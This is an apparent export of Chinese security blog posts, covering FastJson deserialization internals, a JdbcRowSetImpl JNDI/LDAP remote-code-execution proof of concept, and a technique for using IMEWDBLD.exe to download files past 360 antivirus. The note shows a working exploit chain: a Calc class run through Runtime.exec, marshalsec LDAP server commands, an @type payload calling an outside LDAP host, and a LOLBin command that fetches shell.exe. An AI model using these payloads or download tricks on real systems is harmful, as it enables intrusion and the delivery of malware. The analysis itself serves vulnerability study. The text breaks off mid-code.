<p>在user4里面，有四个变量key1，key2，key3，key4，其中key1，key2和key3都是私有变量(private)，但是key1和key2有setter类方法，key3则没有，而key4是公共变量(public)。所以在没有设置<code>Feature.SupportNonPublicField</code>时，totring()返回结果为<code>===&gt; user&#123;key1=&#39;key11&#39;, key2=&#39;key22&#39;, key3=&#39;null&#39;, key4=&#39;key44&#39;&#125;</code>。其中key3无法被赋值，为null。</p>
<p>而在设置了Feature.SupportNonPublicField后，key3就赋值成功了。</p>
<p>具体流程分析</p>
<p>在经过一次次回溯后，找到JavaBeanDeserializer.java#parseField()中。</p>
<p><img src="image-20240312162041859.png" alt="image-20240312162041859"></p>
<p><img src="image-20240312162149768.png" alt="image-20240312162149768"></p>
<p>当没有设置<code>Feature.SupportNonPublicField</code>时，fieldDeserializer为null，在经过<code>parser.parseExtra(object, key)</code>后就结束了（如上图），而在设置了<code>Feature.SupportNonPublicField</code>后，ieldDeserializer不为null，代码就会走到下面的<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues)</code>中，在这里面通过`setValue(object, value) –&gt; field.set(object, value)将_key3通过反射进行赋值，</p>
<p><img src="image-20240312162458479.png" alt="image-20240312162458479"></p>
<p><img src="image-20240312170154792.png" alt="image-20240312170154792"></p>
<p>现在来看一下fieldDeserializer是如何被<code>Feature.SupportNonPublicField</code>影响的。</p>
<p>定义：没有区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FieldDeserializer fieldDeserializer &#x3D; smartMatch(key);</span><br></pre></td></tr></table></figure>

<p>赋值：</p>
<p>这是设置了<code>Feature.SupportNonPublicField</code>的。如果没设置这个特性，直接走不到这个地方。</p>
<p><img src="image-20240312171414009.png" alt="image-20240312171414009"></p>
<p>代码会在这个判断中返回false，自然就无法在里面为fieldDeserializer赋值</p>
<p><img src="image-20240312171803481.png" alt="image-20240312171803481"></p>
<p>这个判断里，fieldDeserializer == null默认为true，此时没有设置特性，所以后面两个都是false，当设置了特性后，<code>parser.lexer.isEnabled(mask) </code>的结果就为true了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fieldDeserializer &#x3D;&#x3D; null &amp;&amp; </span><br><span class="line">(  </span><br><span class="line">   parser.lexer.isEnabled(mask)  || </span><br><span class="line">   (this.beanInfo.parserFeatures &amp; mask) !&#x3D; 0)</span><br><span class="line">) </span><br></pre></td></tr></table></figure>







<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>环境</p>
<ul>
<li>ubuntu 22.04</li>
<li>java version “1.8.0_102”</li>
<li>marshalsec-0.0.3-SNAPSHOT-all.jar （sha1 22f311752a1c6ce1102bcb199458c8d10118ae6e）</li>
</ul>
<p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;;<span class="comment">//win的目标可以换成calc</span></span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javac Calc.java生成Calc.class后，使用python起一个web服务。</p>
<ul>
<li>sudo python3 -m http.server 8888</li>
</ul>
<p>然后使用marshalsec-0.0.3-SNAPSHOT-all.jar起一个LDAP服务</p>
<ul>
<li>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link" href="http://0.0.0.0:8888/#Calc&quot;">http://0.0.0.0:8888/#Calc&quot;<i class="fas fa-external-link-alt"></i></a> 9999</li>
</ul>
<p>再然后idea里的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test11</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String cmd = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.56.213:9999/calc\&quot;,  \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    Object P2 = JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240307142526862.png" alt="image-20240307142526862"></p>
<p>流程分析：</p>
<p>在com.sun.rowset.JdbcRowSetImpl类中，有一个setAutoCommit类，完全符合fastjson自动调用的setter方法的条件：长度大于4、非静态、void返回、set后的字母大写、参数为1。需要payload中有”autoCommit&quot;:true。设置为true，是为了让这个函数能执行this.connect()。这个connect()才是执行命令的关键</p>
<p><img src="image-20240307145501023.png" alt="image-20240307145501023"></p>
<p>ctrl+左键进入connect()内，可以看到危险代码(DataSource)var1.lookup(this.getDataSourceName());关键是这个<code>lookup()</code>,目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；</p>
<p><img src="image-20240307150004307.png" alt="image-20240307150004307"></p>
<h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><p>之前的流程相同，在检测到DEFAULT_TYPE_KEY(@type)后，多了这一行判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20231101161912921.png" alt="image-20231101161912921"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" href="https://tttang.com/archive/1579/#toc__2">https://tttang.com/archive/1579/#toc__2<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.bilibili.com/video/BV1bD4y117Qh/">https://www.bilibili.com/video/BV1bD4y117Qh/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.anquanke.com/post/id/240446#h3-6">https://www.anquanke.com/post/id/240446#h3-6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://javasec.org/java-vuls/FastJson.html">https://javasec.org/java-vuls/FastJson.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>IMEWDBLD.exe ByPass360 下载文件</title>
    <url>/2021/07/09/IMEWDBLD-exe-ByPass360-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6-This-is-Y/</url>
    <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg">https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg<i class="fas fa-external-link-alt"></i></a></p>
<p>IMEWDBLD.exe是微软拼音的开放扩展字典模块，主要用来下载字典文件，在Windows中主要存在路径为：C:\Windows\System32\IME\SHARED\IMEWDBLD.exe</p>
<p>下载命令为</p>
<pre><code>C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://xxxxx/shell.exe
</code></pre>
<p>下载后的存放路径为</p>
<pre><code>C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]
</code></pre>
<p>下载时会弹出报错，不用管</p>
<p><img src="image-20210709103503656.png" alt="image-20210709103503656"></p>
<p>下载后找到文件位置（主要是为了找到这个随机值）<br>    forfiles /P “%localappdata%\Microsoft\Windows\INetCache” /S /M * /C “cmd /c echo @path”</p>
<pre><code>    参数介绍
/P 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。
/S 指导 forfiles 递归到子目录。像 &quot;DIR /S&quot;。
/M 根据搜索掩码搜索文件。默认搜索掩码是 &#39;*&#39;。
/C 表示为每个文件执行的命令。命令字符串应该用双引号括起来。
@path 返回文件的完整路径
</code></pre>
<p>一般下载后，就会名字后面会多一个[1]</p>
<p><img src="image-20210709103653910.png" alt="image-20210709103653910"></p>
<p><img src="image-20210709103558230.png" alt="image-20210709103558230"></p>
]]></content>
  </entry>
  <entry>
    <title>FastJson反序列化分析笔记</title>
    <url>/2023/10/27/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-y-acer-2/</url>
    <content><![CDATA[<h1 id="两个特性"><a href="#两个特性" class="headerlink" title="两个特性"></a>两个特性</h1><h2 id="用户可控制反序列化的对象"><a href="#用户可控制反序列化的对象" class="headerlink" title="用户可控制反序列化的对象"></a>用户可控制反序列化的对象</h2><p>user类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是调用函数,我都是写在各种小test里，然后在main中调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//test1();</span></span><br><span class="line">        <span class="comment">//test2();</span></span><br><span class="line">        test3();</span><br><span class="line">        <span class="comment">//test4();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安全的使用方法："><a href="#安全的使用方法：" class="headerlink" title="安全的使用方法："></a>安全的使用方法：</h3><p>先看正确的使用方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// 安全的写法</span></span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">        user tmpuser = JSON.parseObject(p1, user.class);  <span class="comment">//限制死了反序列化的类型为user</span></span><br><span class="line">        System.out.println(tmpuser.getAge());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231027102647188.png" alt="image-20231027102647188"></p>
<p>可以看到输出中，出现了</p>
<p><code>user构造函数user(无参数)</code></p>
<p>这是因为需要构造user对象tmpuser。</p>
<p><code>user调用了setAge user调用了setHobby user调用了setName</code></p>
<p>这三个出现，是因为在构造过程中，给age，name，hobby这三个属性赋值了。</p>
<p><code>user调用了getAg  </code><br><code>18</code> </p>
<p>是tmpuser.getAge()这一行输出的。</p>
<p>限制死了反序列化的类型为user，这种由开发者控制的反序列化的类型，是安全的。</p>
<h3 id="不安全的使用方法："><a href="#不安全的使用方法：" class="headerlink" title="不安全的使用方法："></a>不安全的使用方法：</h3><p>因为fastjson有一个特性，可以由用户指定反序列化的类型，通过@type字段。可以先设置另一个user2对象</p>
<p>代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user2</span> </span>&#123;    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后是调用代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    String p2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user2\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">    Object P1 = JSON.parse(p1);</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p2):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parse(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<p><img src="image-20231027111614060.png" alt="image-20231027111614060"></p>
<p>可以将test()理解为一个函数，用户输入序列化后的字符串交给服务器，服务器对字符串进行反序列化，这里输入的p1,p2就可以理解为调用了两次函数。</p>
<h2 id="调用getName方法"><a href="#调用getName方法" class="headerlink" title="调用getName方法"></a>调用getName方法</h2><p>但反序列化字符串的函数不是parse而是parseObject时，就会调用对象中的getter类方法，比如getName，getAge,getHobby。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">       Object P1 = JSON.parse(p1);</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">       Object P2 = JSON.parseObject(p1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231027112258302.png" alt="image-20231027112258302"></p>
<p>在了解这两种机制后，就可能会出现下面这种情况：代码中出现了 JSON.parseObject(p1); 可能设计初衷只是想解析反序列化”{&quot;age&quot;:18,&quot;hobby&quot;:&quot;gaming&quot;,&quot;name&quot;:&quot;y&quot;}”这样的字符串，但是因为这两个特性，就可能出现一些意想不到的结果</p>
<h1 id="调用流程分析"><a href="#调用流程分析" class="headerlink" title="调用流程分析"></a>调用流程分析</h1><p>先来捋顺正常的调用，再来看漏洞的调用</p>
<h2 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h2><h3 id="识别-type"><a href="#识别-type" class="headerlink" title="识别@type"></a>识别@type</h3><p>使用如下代码，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parseObject(p1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>断点下载        Object P2 = JSON.parseObject(p1); </p>
<p>前面都是普通的调来调去，一直到这里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(Object fieldName)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> JSONLexer lexer = <span class="keyword">this</span>.lexer;</span><br><span class="line">       <span class="keyword">switch</span> (lexer.token()) &#123;</span><br><span class="line">…………</span><br><span class="line">   …………</span><br><span class="line">           <span class="keyword">case</span> LBRACE:</span><br><span class="line">               JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">               <span class="keyword">return</span> parseObject(object, fieldName);</span><br><span class="line">   …………</span><br><span class="line">   ………… </span><br></pre></td></tr></table></figure>

<p><img src="image-20231030110516526.png" alt="image-20231030110516526"></p>
<p>这里的lexer是由之前JSON.java中的</p>
<p><code>DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</code></p>
<p>这一行定义和赋值</p>
<p>在swtich中，识别到第一个字符串是<code>&#123;</code> (也就是 LBRACE )后，通过</p>
<p><code>return parseObject(object, fieldName);</code></p>
<p>进入到了parseObject函数中，这个函数还是在当前DefaultJSONParser.java文件中</p>
<p><img src="image-20231030111221334.png" alt="image-20231030111221334"></p>
<p>经过几个判断后，进入到try finally 代码块中，这里面是一个for(;;)死循环，然后可以看到有一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        object.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ………………</span><br><span class="line">    ………………</span><br></pre></td></tr></table></figure>

<p><code>JSON.DEFAULT_TYPE_KEY</code>是<code>@type</code> </p>
<p>lexer.isEnabled()会返回入参的mask字段，这边的<code>Feature.DisableSpecialKeyDetect</code>内容如下，所以!lexer.isEnabled(Feature.DisableSpecialKeyDetect)的结果为true</p>
<p><img src="image-20231030112553007.png" alt="image-20231030112553007"></p>
<p>随后就获取到@type的value：<code>org.example.user</code></p>
<p>这边的意思大概就是，通过识别到<code>&#123;</code>开头，然后开始进行反序列化的字符从识别，识别到@type，意味着需要指定类进行java反序列化。这边的下一行</p>
<p><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></p>
<p>就是加载制定的类以便于反序列化</p>
<h3 id="加载指定类"><a href="#加载指定类" class="headerlink" title="加载指定类"></a>加载指定类</h3><p>在上面用loadlass加载完类后，继续这个if代码块，在最下面有一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>这边是为了获取反序列化器deserializer，跟进getDeserializer，因为<code>type instanceof Class&lt;?&gt;</code>，跳到<code> getDeserializer((Class&lt;?&gt;) type, type)</code>中，</p>
<p>在这个getDeserializer，会经过一些替换处理，if判断，比如说会把<code>$</code>换成<code>.</code></p>
<ul>
<li>className = className.replace(‘$’, ‘.’);</li>
</ul>
<p>会检测是否<code>java.awt.</code>开头等等。</p>
<p>最后因为传入的value是org.example.user，流程会来到461行的</p>
<p><code>derializer = createJavaBeanDeserializer(clazz, type);</code></p>
<p><img src="image-20231030115601476.png" alt="image-20231030115601476"></p>
<p>跟进createJavaBeanDeserializer(),这个函数里的判断主要是围绕 <strong>asmEnable</strong> 变量的true和false来进行的，在一系列的处理后，来到了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br></pre></td></tr></table></figure>

<p><img src="image-20231030144038009.png" alt="image-20231030144038009"></p>
<p>跟进这个build()函数，这函数内容也非常多，不过因为两个长的 if 代码块不会运行，所以可以忽略，重点是下面的三个 for 代码块，</p>
<p><img src="image-20231030144752366.png" alt="image-20231030144752366"></p>
<p>其中第一个循环 <code>for (Method method : methods) </code> 是在指定的java类中找setter类方法。那些“函数命名以set开头，第四个字母大写”之类的条件，就是在这里进行判断处理的。</p>
<p><img src="image-20231030145529136.png" alt="image-20231030145529136"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String methodName = method.getName();</span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;   <span class="comment">//方法名长度大于4</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;      <span class="comment">//非静态方法</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// support builder set</span></span><br><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JSONField annotation = method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">    annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> 